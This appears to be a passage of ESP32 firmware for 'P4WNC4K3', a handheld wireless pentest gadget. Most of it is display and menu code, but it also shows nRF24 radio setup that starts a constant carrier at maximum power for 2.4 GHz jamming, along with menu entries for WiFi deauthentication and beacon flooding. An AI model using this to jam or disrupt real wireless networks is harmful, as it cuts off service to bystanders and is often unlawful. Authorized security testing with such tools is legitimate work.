  Serial.println("OK");

  // ===== RADIO 1 INITIALIZATION =====
  Serial.print("[RADIO 1] CE=26, CSN=25... ");
  if (radio1.begin(&hspi)) {
    radio1.setDataRate(RF24_2MBPS);
    radio1.setAutoAck(false);
    radio1.setCRCLength(RF24_CRC_DISABLED);
    radio1.setPALevel(RF24_PA_MAX);
    radio1.setRetries(0, 0);
    radio1.stopListening();
    
    // ✅ START CONSTANT CARRIER ONCE
    radio1.startConstCarrier(RF24_PA_MAX, hopping_channel[0]);
    delay(50);
    nrf1Available = true;
    Serial.println("✅ DETECTED - Carrier ON");
  } else {
    Serial.println("❌ NOT FOUND");
  }

  // ===== RADIO 2 INITIALIZATION =====
  Serial.print("[RADIO 2] CE=33, CSN=27... ");
  if (radio2.begin(&hspi)) {
    radio2.setDataRate(RF24_2MBPS);
    radio2.setAutoAck(false);
    radio2.setCRCLength(RF24_CRC_DISABLED);
    radio2.setPALevel(RF24_PA_MAX);
    radio2.setRetries(0, 0);
    radio2.stopListening();
    
    // ✅ START CONSTANT CARRIER ONCE
    radio2.startConstCarrier(RF24_PA_MAX, hopping_channel[ptr_hop2]);
    delay(50);
    nrf2Available = true;
    Serial.println("✅ DETECTED - Carrier ON");
  } else {
    Serial.println("❌ NOT FOUND");
  }

  // ===== STATUS SUMMARY =====
  Serial.println();
  if (nrf1Available && nrf2Available) {
    Serial.println("[+] DUAL nRF24 MODE - Both radios ready!");
    Serial.println("    Target: 50K-80K hops/sec (shared HSPI)");
    Serial.println("    Using 16 MHz SPI speed");
    addToConsole("DUAL nRF24 @ 16MHz");
    dualNRFMode = true;
  } else if (nrf1Available || nrf2Available) {
    Serial.println("[+] SINGLE nRF24 MODE - One radio ready");
    Serial.println("    Target: 30K-50K hops/sec");
    addToConsole("Single nRF24");
    dualNRFMode = false;
  } else {
    Serial.println("[!] WARNING: No nRF24 modules detected");
    addToConsole("WARNING: No nRF24!");
  }
  
  // ==================== BOOT ANIMATION ====================
  Serial.println("\n[*] Starting boot animation...");
  playBootAnimation();
  
  // ==================== CONSOLE INITIALIZATION ====================
  addToConsole("P4WNC4K3 initialized");
  addToConsole("System ready for pentest");
  
  // ==================== DRAW MAIN MENU ====================
  Serial.println("\n[+] System initialization complete!");
  Serial.println("    Ready for pentesting operations\n");
  
  currentState = MAIN_MENU;
  drawMainMenu();
  
  Serial.println("╔═══════════════════════════════════════╗");
  Serial.println("║         SYSTEM READY                   ║");
  Serial.println("╚═══════════════════════════════════════╝");
  Serial.println("\nType 'help' in serial console for commands");
  Serial.println();
}

#define COLOR_HEADER    0x0208  // Very dark blue-grey
#define COLOR_TEXT      0xCE79  // Light grey text
#define COLOR_SELECTED  0x07E0  // Matrix green (selected items)
#define COLOR_ITEM_BG   0x0208  // Very dark blue-grey (same as header)
#define COLOR_BORDER    0x0320  // Dark green border
#define COLOR_WARNING   0xFD20  // Orange
#define COLOR_SUCCESS   0x07E0  // Matrix green
#define COLOR_CRITICAL  0xC800  // Dark red
#define COLOR_ACCENT    0x07E0  // Matrix green (was Kali blue)
#define COLOR_PURPLE    0x8012  // Dark purple
#define COLOR_MATRIX_GREEN  0x07E0  // Bright Matrix green
#define COLOR_DARK_GREEN    0x0320  // Dark green for fade effect
#define COLOR_LIME          0x87F0  // Lime green accent

// New boot animation function
void playBootAnimation() {
  tft.fillScreen(COLOR_BG);
  
  // Display mask and modules together
  displayIntegratedBoot();
  
  // Done - go to main menu
  currentState = MAIN_MENU;
}

const char maskASCII[] PROGMEM = 
"cccccccccccahhhhhhaaaahhhhhaaccccccccccc\n"
"cccchacccccccccccccccccccccccccchhcccc\n"
"ccaccccccccccccccccccccccccccccccckcaccc\n"
"cchcccccccccccccccccccccccccccccccccchcc\n"
"cacccahhhhhhacccccccccccccchhhhhhhaccaac\n"
"chcchhhhhhhhhaccccccccccccahhhhhhhhhcchc\n"
"caccccccccahhhhhcccccccchhhhhaccccccccac\n"
"cacccccccccccahacccccccchhacccccccccccac\n"
"cccccccahaaaaachcccccccaacaaaaahacccccac\n"
"accccahhhhhhhhhhcaccccachhhhhhhhhhaccccc\n"
"acaaaahhhaaahhacchcccchccahaaaaahaaaaccc\n"
"acccccccccccccccahcccchccccccccccccccccc\n"
"accccccccccccccchhcccchhcccccccccccccccc\n"
"ccccccccccccccaaaacccchaaaccccccccccccac\n"
"caccccccccahhhccaaccccaccaahhcccccccccac\n"
"cachhhhhaccccccaahaccahaaccccccahhhhachc\n"
"chcchhahacccccccahhhahhccccccccahahaccac\n"
"ccacchhhhaacaaahhhhcchhhhaccachhahhcchcc\n"
"ccaccchhcahhhhhhhcccccahhhhhhhaahacccacc\n"
"ccchcccahacccccccccccccccccccaahaccchccc\n"
"cccchccccaccccccccaaaacccccccchccccacccc\n"
"cccccaacccacccccccahhcccccccccccchcccccc\n"
"cccccccaaccccccccchhhacccccccccaaccccccc\n"
"ccccccccchcccccccchhhhcccccccahccccccccc\n"
"ccccccccccchcccccchhhhcccccahccccccccccc\n"
"cccccccccccccahcccahhcccchaccccccccccccc\n"
"ccccccccccccccccahhhhhhacccccccccccccccc\n";

// ==================== OPTIMIZED BOOT WITH TALLER SLIMMER SKULL ====================
void displayIntegratedBoot() {
  tft.fillScreen(COLOR_BG);
  
  // ===== TALLER & SLIMMER SKULL - Adjusted rendering =====
  int lineCount = 27;
  int pixelsPerChar = 3;
  
  int maxLineWidth = 41;
  int totalMaskWidth = maxLineWidth * pixelsPerChar;
  int totalMaskHeight = lineCount * pixelsPerChar;
  
  int maskStartX = (240 - totalMaskWidth) / 2;
  int maskStartY = 15;
  
  // ✅ FIX: Move to heap to avoid stack overflow
  char (*lines)[42] = new char[27][42];
  
  // Clear array first
  for (int i = 0; i < 27; i++) {
    for (int j = 0; j < 42; j++) {
      lines[i][j] = '\0';
    }
  }
  
  int lineIndex = 0;
  int charIndex = 0;
  int linePos = 0;
  
  while (lineIndex < 27) {
    char c = pgm_read_byte(&maskASCII[charIndex]);
    if (c == '\0') break;
    
    if (c == '\n') {
      lines[lineIndex][linePos] = '\0';
      lineIndex++;
      linePos = 0;
    } else if (linePos < 41) {
      lines[lineIndex][linePos++] = c;
    }
    charIndex++;
    if (charIndex > 2000) break;
  }
  
  if (lineIndex < 27 && linePos > 0) {
    lines[lineIndex][linePos] = '\0';
  }
  
  // ===== MESSAGES AT BOTTOM =====
  int msgStartY = 190;
  
  tft.setTextSize(1);
  tft.setTextColor(COLOR_RED);
  tft.setCursor(5, msgStartY);
  tft.print("root@p4wnc4k3:~# ");
  tft.setTextColor(COLOR_TEXT);
  tft.println("init");
  msgStartY += 12;
  
  tft.drawLine(0, msgStartY, 240, msgStartY, COLOR_DARK_GREEN);
  msgStartY += 8;
  
  const char* modules[] = {"WiFi", "BLE", "nRF#1", "nRF#2", "SPIFFS", "TFT"};
  int moduleY[6];
  int col1X = 8;
  int col2X = 128;
  
  for (int i = 0; i < 6; i++) {
    int x = (i < 3) ? col1X : col2X;
    int row = (i < 3) ? i : (i - 3);
    moduleY[i] = msgStartY + (row * 11);
    
    tft.setTextColor(COLOR_TEXT);
    tft.setCursor(x, moduleY[i]);
    tft.print("[");
    tft.setTextColor(COLOR_GREEN);
    tft.print("*");
    tft.setTextColor(COLOR_TEXT);
    tft.print("] ");
    tft.print(modules[i]);
  }
  
  // ===== ANIMATE SKULL =====
  bool revealed[27][41];
  for (int y = 0; y < 27; y++) {
    for (int x = 0; x < 41; x++) {
      revealed[y][x] = false;
    }
  }
  
  int totalPixels = 0;
  for (int y = 0; y < 27; y++) {
    for (int x = 0; x < 41; x++) {
      char pixel = lines[y][x];
      if (pixel != 'c' && pixel != '\0') {
        totalPixels++;
      }
    }
  }
  
  int pixelsRevealed = 0;
  int moduleIndex = 0;
  int pixelsPerModule = (totalPixels > 0) ? (totalPixels / 6) : 1;
  int animationSteps = 15;
  
  while (pixelsRevealed < totalPixels) {
    // Feed watchdog every iteration
    esp_task_wdt_reset();
    
    for (int step = 0; step < animationSteps && pixelsRevealed < totalPixels; step++) {
      int randY = random(0, 27);
      int randX = random(0, 41);
      
      if (revealed[randY][randX]) {
        continue;
      }
      
      char pixel = lines[randY][randX];
      
      if (pixel == 'c' || pixel == '\0') {
        revealed[randY][randX] = true;
        continue;
      }
      
      revealed[randY][randX] = true;
      pixelsRevealed++;
      
      int xPos = maskStartX + (randX * pixelsPerChar);
      int yPos = maskStartY + (randY * pixelsPerChar) + (randY * pixelsPerChar);
      
      uint16_t color;
      if (pixel == 'h') color = COLOR_GREEN;
      else if (pixel == 'a') color = COLOR_DARK_GREEN;
      else if (pixel == 'k') color = COLOR_GREEN;
      else color = COLOR_GREEN;
      
      tft.fillRect(xPos, yPos, pixelsPerChar - 1, (pixelsPerChar * 2) - 2, color);
    }
    
    int currentModule = pixelsRevealed / pixelsPerModule;
    if (currentModule > moduleIndex && currentModule <= 6) {
      for (int m = moduleIndex; m < currentModule && m < 6; m++) {
        bool moduleOK = true;
        uint16_t statusColor = COLOR_SUCCESS;
        String statusText = "OK";
        
        if (m == 2) {
          moduleOK = nrf1Available;
          if (!moduleOK) { statusColor = COLOR_ORANGE; statusText = "X"; }
        } else if (m == 3) {
          moduleOK = nrf2Available;
          if (!moduleOK) { statusColor = COLOR_ORANGE; statusText = "X"; }
        }
        
        int modX = (m < 3) ? col1X : col2X;
        int row = (m < 3) ? m : (m - 3);
        
        tft.setTextColor(statusColor);
        tft.setCursor(modX + 65, msgStartY + (row * 11));
        tft.println(statusText);
      }
      moduleIndex = currentModule;
    }
    
    delay(5);
  }
  
  for (int i = moduleIndex; i < 6; i++) {
    uint16_t statusColor = COLOR_SUCCESS;
    String statusText = "OK";
    
    if (i == 2 && !nrf1Available) { statusColor = COLOR_ORANGE; statusText = "X"; }
    else if (i == 3 && !nrf2Available) { statusColor = COLOR_ORANGE; statusText = "X"; }
    
    int x = (i < 3) ? col1X : col2X;
    int row = (i < 3) ? i : (i - 3);
    
    tft.setTextColor(statusColor);
    tft.setCursor(x + 65, msgStartY + (row * 11));
    tft.println(statusText);
    delay(80);
  }
  
  // ===== FINAL STATUS =====
  int finalY = 270;
  tft.drawLine(0, finalY, 240, finalY, COLOR_DARK_GREEN);
  finalY += 6;
  
  tft.setTextSize(1);
  tft.setTextColor(COLOR_LIME);
  tft.setCursor(5, finalY);
  tft.print("[");
  tft.setTextColor(COLOR_SUCCESS);
  tft.print("+");
  tft.setTextColor(COLOR_LIME);
  tft.print("] System initialized");
  finalY += 11;
  
  tft.setTextColor(COLOR_RED);
  tft.setCursor(5, finalY);
  tft.print("root@p4wncak3:~# ");
  tft.setTextColor(COLOR_TEXT);
  tft.println("ready");
  
  delete[] lines;
  
  delay(1500);
}

void addToConsole(String message) {
  consoleBuffer[consoleIndex] = message;
  consoleIndex = (consoleIndex + 1) % 15;
  Serial.println("[LOG] " + message);
}

// Improved header with better styling
void drawHeader(const char* title) {
  // Dark header with green accent
  drawTerminalHeader(title);
  
  // Console-style prompt
  tft.setTextColor(COLOR_RED);
  tft.setTextSize(1);
  tft.setCursor(5, 8);
  tft.print("root@p4wnc4k3:~# ");
  
  // Title
  tft.setTextColor(COLOR_TEXT);
  tft.setTextSize(2);
  tft.setCursor(5, 18);
  tft.println(title);
}

void showMessage(const char* msg, uint16_t color) {
  int boxW = 200;
  int boxH = 60;
  int boxX = (240 - boxW) / 2;
  int boxY = (320 - boxH) / 2;
  
  // Semi-transparent overlay effect
  tft.fillRect(boxX, boxY, boxW, boxH, COLOR_BG);
  tft.drawRect(boxX, boxY, boxW, boxH, color);
  tft.drawRect(boxX + 1, boxY + 1, boxW - 2, boxH - 2, COLOR_DARK_GREEN);
  
  // Icon
  tft.setTextSize(1);
  tft.setTextColor(color);
  tft.setCursor(boxX + 10, boxY + 20);
  tft.print("[");
  if (color == COLOR_GREEN) tft.print("+");
  else if (color == COLOR_RED) tft.print("!");
  else if (color == COLOR_ORANGE) tft.print("*");
  else tft.print("i");
  tft.print("]");
  
  // Message
  tft.setTextColor(COLOR_TEXT);
  tft.setCursor(boxX + 30, boxY + 20);
  
  // Word wrap for long messages
  String message = String(msg);
  if (message.length() > 25) {
    String line1 = message.substring(0, 25);
    String line2 = message.substring(25);
    tft.println(line1);
    tft.setCursor(boxX + 10, boxY + 32);
    tft.print(line2);
  } else {
    tft.print(msg);
  }
  
  delay(800);
}

// PART 2/3 - Menu Drawing and Touch Handling Functions
// This continues from Part 1

void drawMainMenu() {
  tft.fillScreen(COLOR_BG);
  drawTerminalHeader("main menu");
  
  const char* menuItems[] = {
    "WiFi Tools",
    "Bluetooth Tools",
    "Packet Sniffer",
    "More Tools",
    "Settings"
  };
  
  int y = HEADER_HEIGHT + 10;
  for (int i = 0; i < 5; i++) {
    drawMenuItem(menuItems[i], i, y, hoveredIndex == i, false);
    y += MENU_ITEM_HEIGHT + MENU_SPACING;
  }
  
  // System status at bottom
  tft.setTextSize(1);
  tft.setTextColor(COLOR_GREEN);
  tft.setCursor(SIDE_MARGIN, 280);
  tft.printf("Heap: %dK | APs: %d", ESP.getFreeHeap() / 1024, networkCount);
  
  // Version
  tft.setCursor(SIDE_MARGIN, 295);
  tft.setTextColor(COLOR_CYAN);
  tft.print("P4WNC4K3 v1.0");
}

void drawWiFiMenu() {
  tft.fillScreen(COLOR_BG);
  drawTerminalHeader("wifi tools");
  
  const char* menuItems[] = {
    "Scan Networks",
    "Select Target",
    "Beacon Manager",
    "Deauth Flood"
  };
  
  int y = HEADER_HEIGHT + 10;
  for (int i = 0; i < 4; i++) {
    drawMenuItem(menuItems[i], i, y, hoveredIndex == i, false);
    y += MENU_ITEM_HEIGHT + MENU_SPACING;
  }
  
  // Status
  tft.setTextSize(1);
  tft.setTextColor(COLOR_DARK_GREEN);
  tft.setCursor(SIDE_MARGIN, 250);
  tft.printf("Cached APs: ");
  tft.setTextColor(COLOR_CYAN);
  tft.printf("%d", networkCount);
  
  if (selectedSSID.length() > 0) {
    tft.setTextColor(COLOR_DARK_GREEN);
    tft.setCursor(SIDE_MARGIN, 265);
    tft.print("Current target: ");
    tft.setTextColor(COLOR_YELLOW);
    String truncSSID = selectedSSID;
    if (truncSSID.length() > 18) truncSSID = truncSSID.substring(0, 17) + "~";
    tft.println(truncSSID);
  }
  
  // Back button
  int backY = 305;
  tft.drawFastHLine(0, backY - 2, 240, COLOR_GREEN);
  tft.setTextColor(COLOR_RED);
  tft.setCursor(85, backY + 3);
  tft.print("[ESC] Back");
}

void drawSettingsMenu() {
  tft.fillScreen(COLOR_BG);
  drawTerminalHeader("settings");
  
  const char* menuItems[] = {
    "Device Info",
    "SD Card",
    "Show ASCII Art",
    "Reboot Device"
  };
  
  int y = HEADER_HEIGHT + 10;
  for (int i = 0; i < 4; i++) {
    drawMenuItem(menuItems[i], i, y, hoveredIndex == i, false);
    y += MENU_ITEM_HEIGHT + MENU_SPACING;
  }
  
  // Back button
  int backY = 305;
  tft.drawFastHLine(0, backY - 2, 240, COLOR_GREEN);
  tft.setTextColor(COLOR_RED);
  tft.setCursor(85, backY + 3);
  tft.print("[ESC] Back");
}

void drawDeviceInfo() {
  tft.fillScreen(COLOR_BG);
  drawTerminalHeader("device info");
  
  int y = HEADER_HEIGHT + 15;
  
  // ✅ nRF24 #1 Status - REAL STATE
  tft.setTextSize(1);
  tft.setTextColor(COLOR_DARK_GREEN);
  tft.setCursor(SIDE_MARGIN, y);
  tft.print("nRF24L01 #1:");
  
  uint16_t statusColor1 = COLOR_RED;
  const char* statusText1 = "NOT FOUND";
  
  if (nrf1Available) {
    if (nrfJammerActive) {
      statusColor1 = COLOR_ORANGE;
      statusText1 = "JAMMING";
    } else {
      statusColor1 = COLOR_GREEN;
      statusText1 = "READY";
    }
  }
  
  tft.setTextColor(statusColor1);
  tft.setCursor(140, y);
  tft.print(statusText1);
  
  y += 20;
  
  // ✅ nRF24 #2 Status - REAL STATE
  tft.setTextColor(COLOR_DARK_GREEN);
  tft.setCursor(SIDE_MARGIN, y);
  tft.print("nRF24L01 #2:");
  
  uint16_t statusColor2 = COLOR_RED;
  const char* statusText2 = "NOT FOUND";
  
  if (nrf2Available) {
    if (nrfJammerActive && dualNRFMode) {
      statusColor2 = COLOR_ORANGE;
      statusText2 = "JAMMING";
    } else if (nrf2Available) {
      statusColor2 = COLOR_GREEN;
      statusText2 = "READY";
    }
  }
  
  tft.setTextColor(statusColor2);
  tft.setCursor(140, y);
  tft.print(statusText2);
  
  y += 30;
  tft.drawFastHLine(0, y, 240, COLOR_DARK_GREEN);
  y += 10;
  
  // Hardware Info
  tft.setTextColor(COLOR_CYAN);
  tft.setCursor(SIDE_MARGIN, y);
  tft.println("Hardware Info:");
  y += 15;
  
  tft.setTextColor(COLOR_DARK_GREEN);
  tft.setCursor(SIDE_MARGIN, y);
  tft.print("Chip: ");
  tft.setTextColor(COLOR_TEXT);
  tft.println(ESP.getChipModel());
  y += 12;
  
  tft.setTextColor(COLOR_DARK_GREEN);
  tft.setCursor(SIDE_MARGIN, y);
  tft.print("CPU: ");
  tft.setTextColor(COLOR_TEXT);
  tft.printf("%d MHz", ESP.getCpuFreqMHz());
  y += 12;
  
  tft.setTextColor(COLOR_DARK_GREEN);
  tft.setCursor(SIDE_MARGIN, y);
  tft.print("Flash: ");
  tft.setTextColor(COLOR_TEXT);
  tft.printf("%d MB", ESP.getFlashChipSize() / 1048576);
  y += 12;
  
  tft.setTextColor(COLOR_DARK_GREEN);
  tft.setCursor(SIDE_MARGIN, y);
  tft.print("Free Heap: ");
  tft.setTextColor(COLOR_TEXT);
  tft.printf("%d KB", ESP.getFreeHeap() / 1024);
  y += 12;
  
  tft.setTextColor(COLOR_DARK_GREEN);
  tft.setCursor(SIDE_MARGIN, y);
  tft.print("MAC: ");
  tft.setTextColor(COLOR_TEXT);
  String mac = WiFi.macAddress();
  if (mac.length() > 17) mac = mac.substring(0, 17);
  tft.println(mac);
  
  y += 20;
  tft.drawFastHLine(0, y, 240, COLOR_DARK_GREEN);
  y += 10;
  
  // Developer info
  tft.setTextSize(1);
  tft.setTextColor(COLOR_CYAN);
  tft.setCursor(SIDE_MARGIN, y);
  tft.println("Developed by Shane Sahagun");
  y += 12;
  
  tft.setTextColor(COLOR_TEXT);
  tft.setCursor(SIDE_MARGIN, y);
  tft.println("(p4wnc4k3)");
  y += 15;
  
  tft.setTextColor(COLOR_DARK_GREEN);
  tft.setCursor(SIDE_MARGIN, y);
  tft.println("Purpose:");
  y += 10;
  
  tft.setTextColor(COLOR_TEXT);
  tft.setCursor(SIDE_MARGIN, y);
  tft.println("Educational pentesting tool");
  y += 10;
  tft.setCursor(SIDE_MARGIN, y);
  tft.println("for authorized security");
  y += 10;
  tft.setCursor(SIDE_MARGIN, y);
  tft.println("assessments only.");
  
  // Back button
  int backY = 305;
  tft.drawFastHLine(0, backY - 2, 240, COLOR_GREEN);
  tft.setTextColor(COLOR_RED);
  tft.setCursor(85, backY + 3);
  tft.print("[ESC] Back");
}

void drawASCIIArtViewer() {
  // Just black screen - skull will be drawn centered
  tft.fillScreen(COLOR_BG);
  
  // Draw centered skull animation
  displayASCIIArtCentered();
  
  // Set state so any touch will exit
  currentState = ASCII_ART_VIEWER;
}

void displayASCIIArtCentered() {
  int lineCount = 27;
  int pixelsPerChar = 3;
  
  int maxLineWidth = 41;
  int totalMaskWidth = maxLineWidth * pixelsPerChar;
  int totalMaskHeight = lineCount * pixelsPerChar * 2;
  
  int maskStartX = (240 - totalMaskWidth) / 2;
  int maskStartY = (320 - totalMaskHeight) / 2;
  
  // Parse ASCII art
  char (*lines)[42] = new char[27][42];
  
  for (int i = 0; i < 27; i++) {
    for (int j = 0; j < 42; j++) {
      lines[i][j] = '\0';
    }
  }
  
  int lineIndex = 0;
  int charIndex = 0;
  int linePos = 0;
  
  while (lineIndex < 27) {
    char c = pgm_read_byte(&maskASCII[charIndex]);
    if (c == '\0') break;
    
    if (c == '\n') {
      lines[lineIndex][linePos] = '\0';
      lineIndex++;
      linePos = 0;
    } else if (linePos < 41) {
      lines[lineIndex][linePos++] = c;
    }
    charIndex++;
    if (charIndex > 2000) break;
  }
  
  if (lineIndex < 27 && linePos > 0) {
    lines[lineIndex][linePos] = '\0';
  }
  
  bool revealed[27][41];
  for (int y = 0; y < 27; y++) {
    for (int x = 0; x < 41; x++) {
      revealed[y][x] = false;
    }
  }
  
  int totalPixels = 0;
  for (int y = 0; y < 27; y++) {
    for (int x = 0; x < 41; x++) {
      char pixel = lines[y][x];
      if (pixel != 'c' && pixel != '\0') {
        totalPixels++;
      }
    }
  }
  
  int pixelsRevealed = 0;
  int animationSteps = 15;
  
  while (pixelsRevealed < totalPixels) {
    esp_task_wdt_reset();
    
    for (int step = 0; step < animationSteps && pixelsRevealed < totalPixels; step++) {
      int randY = random(0, 27);
      int randX = random(0, 41);
      
      if (revealed[randY][randX]) continue;
      
      char pixel = lines[randY][randX];
      
      if (pixel == 'c' || pixel == '\0') {
        revealed[randY][randX] = true;
        continue;
      }
      
      revealed[randY][randX] = true;
      pixelsRevealed++;
      
      int xPos = maskStartX + (randX * pixelsPerChar);
      int yPos = maskStartY + (randY * pixelsPerChar * 2);
      
      uint16_t color;
      if (pixel == 'h') color = COLOR_GREEN;
      else if (pixel == 'a') color = COLOR_DARK_GREEN;
      else if (pixel == 'k') color = COLOR_GREEN;
      else color = COLOR_GREEN;
      
      tft.fillRect(xPos, yPos, pixelsPerChar - 1, (pixelsPerChar * 2) - 2, color);
    }
    
    delay(5);
  }
  
  delete[] lines;
}

void displayIntegratedBootCentered() {
  // Same mask rendering as boot, but centered vertically
  int lineCount = 27;
  int pixelsPerChar = 3;
  
  int maxLineWidth = 41;
  int totalMaskWidth = maxLineWidth * pixelsPerChar;
  int totalMaskHeight = lineCount * pixelsPerChar * 2; // Height doubled
  
  // Center both horizontally AND vertically
  int maskStartX = (240 - totalMaskWidth) / 2;
  int maskStartY = (320 - totalMaskHeight) / 2;
  
  char (*lines)[42] = new char[27][42];
  
  for (int i = 0; i < 27; i++) {
    for (int j = 0; j < 42; j++) {
      lines[i][j] = '\0';
    }
  }
  
  int lineIndex = 0;
  int charIndex = 0;
  int linePos = 0;
  
  while (lineIndex < 27) {
    char c = pgm_read_byte(&maskASCII[charIndex]);
    if (c == '\0') break;
    
    if (c == '\n') {
      lines[lineIndex][linePos] = '\0';
      lineIndex++;
      linePos = 0;
    } else if (linePos < 41) {
      lines[lineIndex][linePos++] = c;
    }
    charIndex++;
    if (charIndex > 2000) break;
  }
  
  if (lineIndex < 27 && linePos > 0) {
    lines[lineIndex][linePos] = '\0';
  }
  
  // Draw the skull
  for (int y = 0; y < 27; y++) {
    for (int x = 0; x < 41; x++) {
      char pixel = lines[y][x];
      
      if (pixel == 'c' || pixel == '\0') continue;
      
      int xPos = maskStartX + (x * pixelsPerChar);
      int yPos = maskStartY + (y * pixelsPerChar * 2);
      
      uint16_t color;
      if (pixel == 'h') color = COLOR_GREEN;
      else if (pixel == 'a') color = COLOR_DARK_GREEN;
      else if (pixel == 'k') color = COLOR_GREEN;
      else color = COLOR_GREEN;
      
      tft.fillRect(xPos, yPos, pixelsPerChar - 1, (pixelsPerChar * 2) - 2, color);
    }
  }
  
  delete[] lines;
}

void drawBeaconManager() {
  tft.fillScreen(COLOR_BG);
  drawTerminalHeader("beacon manager");
  
  const char* menuItems[] = {
    "Add Beacon",
    beaconFloodActive ? "Stop Flood" : "Start Flood"
  };
  
  int y = HEADER_HEIGHT + 10;
  for (int i = 0; i < 2; i++) {
    drawMenuItem(menuItems[i], i, y, hoveredIndex == i, false);
    y += MENU_ITEM_HEIGHT + MENU_SPACING;
  }
  
  // Status
  y += 10;
  tft.setTextSize(1);
  tft.setTextColor(COLOR_DARK_GREEN);
  tft.setCursor(SIDE_MARGIN, y);
  tft.printf("Status: ");
  tft.setTextColor(beaconFloodActive ? COLOR_ORANGE : COLOR_GREEN);
  tft.printf(beaconFloodActive ? "FLOODING" : "STOPPED");
  
  y += 15;
  tft.setTextColor(COLOR_DARK_GREEN);
  tft.setCursor(SIDE_MARGIN, y);
  tft.printf("Custom APs: ");
  tft.setTextColor(COLOR_CYAN);
  tft.printf("%d", customBeaconCount);
  
  // List of custom beacons
  y += 25;
  tft.setTextColor(COLOR_DARK_GREEN);
  tft.setCursor(SIDE_MARGIN, y);
  tft.println("Custom Beacon List:");
  y += 15;
  
  if (customBeaconCount == 0) {
    tft.setTextColor(COLOR_TEXT);
    tft.setCursor(SIDE_MARGIN + 5, y);
    tft.println("No custom beacons yet");
  } else {
    int displayCount = min(customBeaconCount - beaconDisplayOffset, MAX_DISPLAY_BEACONS);
    
    for (int i = 0; i < displayCount; i++) {
      int idx = beaconDisplayOffset + i;
      int itemY = y + (i * 22);
      
      // Beacon name
      tft.setTextColor(COLOR_TEXT);
      tft.setCursor(SIDE_MARGIN, itemY);
      String truncated = customBeacons[idx];
      if (truncated.length() > 25) truncated = truncated.substring(0, 24) + "~";
      tft.print(truncated);
      
      // Delete button indicator
      tft.setTextColor(COLOR_RED);
      tft.setCursor(200, itemY);
      tft.print("[X]");
    }
  }
  
  // Back button
  int backY = 305;
  tft.drawFastHLine(0, backY - 2, 240, COLOR_GREEN);
  tft.setTextColor(COLOR_RED);
  tft.setCursor(85, backY + 3);
  tft.print("[ESC] Back");
}

String beaconInputSSID = "";
bool shiftActive = false;
bool symbolsActive = false;

// ==================== FIXED: drawBeaconAddScreen() ====================
void drawBeaconAddScreen() {
  tft.fillScreen(COLOR_BG);
  drawTerminalHeader("add beacon");
  
  // Input box
  int inputY = HEADER_HEIGHT + 10;
  int inputHeight = 40;
  tft.fillRect(SIDE_MARGIN, inputY, 240 - (2 * SIDE_MARGIN), inputHeight, COLOR_ITEM_BG);
  tft.drawRect(SIDE_MARGIN, inputY, 240 - (2 * SIDE_MARGIN), inputHeight, COLOR_MATRIX_GREEN);
  
  tft.setTextSize(2);
  tft.setTextColor(COLOR_TEXT);
  tft.setCursor(SIDE_MARGIN + 5, inputY + 12);
  if (beaconInputSSID.length() > 0) {
    String display = beaconInputSSID;
    if (display.length() > 15) display = display.substring(0, 15);
    tft.print(display);
  } else {
    tft.setTextColor(COLOR_DARK_GREEN);
    tft.print("Enter SSID...");
  }
  
  // Keyboard layout
  int keyY = inputY + inputHeight + 15;
  int keyW = 22;
  int keyH = 28;
  int keySpacing = 2;
  
  const char* keyboard_lower[4][10] = {
    {"1", "2", "3", "4", "5", "6", "7", "8", "9", "0"},
    {"q", "w", "e", "r", "t", "y", "u", "i", "o", "p"},
    {"a", "s", "d", "f", "g", "h", "j", "k", "l", " "},
    {"z", "x", "c", "v", "b", "n", "m", "_", "-", "."}
  };
  
  const char* keyboard_upper[4][10] = {
    {"!", "@", "#", "$", "%", "^", "&", "*", "(", ")"},
    {"Q", "W", "E", "R", "T", "Y", "U", "I", "O", "P"},
    {"A", "S", "D", "F", "G", "H", "J", "K", "L", " "},
    {"Z", "X", "C", "V", "B", "N", "M", "_", "-", "."}
  };
  
  const char* keyboard_symbols[4][10] = {
    {"!", "@", "#", "$", "%", "^", "&", "*", "(", ")"},
    {"[", "]", "{", "}", "<", ">", "|", "\\", "/", "?"},
    {"+", "=", "~", "`", ":", ";", "'", "\"", ",", " "},
    {".", "_", "-", " ", " ", " ", " ", " ", " ", " "}
  };
  
  const char* (*current_layout)[10];
  if (symbolsActive) {
    current_layout = keyboard_symbols;
  } else if (shiftActive) {
    current_layout = keyboard_upper;
  } else {
    current_layout = keyboard_lower;
  }
  
  // Draw keyboard
  for (int row = 0; row < 4; row++) {
    int keysInRow = (row < 3) ? 10 : 9;
    
    for (int col = 0; col < keysInRow; col++) {
      int x = SIDE_MARGIN + (col * (keyW + keySpacing));
      int y = keyY + (row * (keyH + keySpacing));
      
      tft.fillRect(x, y, keyW, keyH, COLOR_HEADER);
      tft.drawRect(x, y, keyW, keyH, COLOR_DARK_GREEN);
      
      tft.setTextSize(1);
      tft.setTextColor(COLOR_MATRIX_GREEN);
      
      int textX = x + (keyW / 2) - 3;
      int textY = y + (keyH / 2) - 4;
      
      tft.setCursor(textX, textY);
      tft.print(current_layout[row][col]);
    }
  }
  
  // ✅ FIXED: Control row - CENTERED
  int controlY = keyY + (4 * (keyH + keySpacing)) + 8;

  int shiftW = 45;
  int spaceW = 80;
  int symW = 50;
  int totalControlWidth = shiftW + 5 + spaceW + 5 + symW;
  int controlStartX = (240 - totalControlWidth) / 2;

  // SHIFT
  tft.fillRect(controlStartX, controlY, shiftW, 28, shiftActive ? COLOR_GREEN : COLOR_HEADER);
  tft.drawRect(controlStartX, controlY, shiftW, 28, COLOR_DARK_GREEN);
  tft.setTextSize(1);
  tft.setTextColor(shiftActive ? COLOR_BG : COLOR_MATRIX_GREEN);
  tft.setCursor(controlStartX + 6, controlY + 10);
  tft.print("SHIFT");

  // SPACE
  int spaceX = controlStartX + shiftW + 5;
  tft.fillRect(spaceX, controlY, spaceW, 28, COLOR_HEADER);
  tft.drawRect(spaceX, controlY, spaceW, 28, COLOR_DARK_GREEN);
  tft.setTextColor(COLOR_MATRIX_GREEN);
  tft.setCursor(spaceX + 22, controlY + 10);
  tft.print("SPACE");

  // SYM
  int symX = spaceX + spaceW + 5;
  tft.fillRect(symX, controlY, symW, 28, symbolsActive ? COLOR_CYAN : COLOR_HEADER);
  tft.drawRect(symX, controlY, symW, 28, COLOR_DARK_GREEN);
  tft.setTextColor(symbolsActive ? COLOR_BG : COLOR_MATRIX_GREEN);
  tft.setCursor(symX + 10, controlY + 10);
  tft.print("SYM");

  controlY += 36;

  // Match top-row width style: 45 - 80 - 50
  int delW = 45;
  int saveW = 80;
  int cancelW = 50;

  int totalActionWidth = delW + 5 + saveW + 5 + cancelW;
